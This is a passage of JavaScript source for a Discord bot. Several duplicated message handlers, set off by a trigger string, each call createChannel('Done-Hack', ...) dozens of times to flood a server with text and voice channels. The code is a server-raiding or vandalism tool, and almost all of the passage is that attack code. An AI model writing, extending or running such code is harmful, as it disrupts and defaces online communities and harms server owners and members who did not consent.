  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
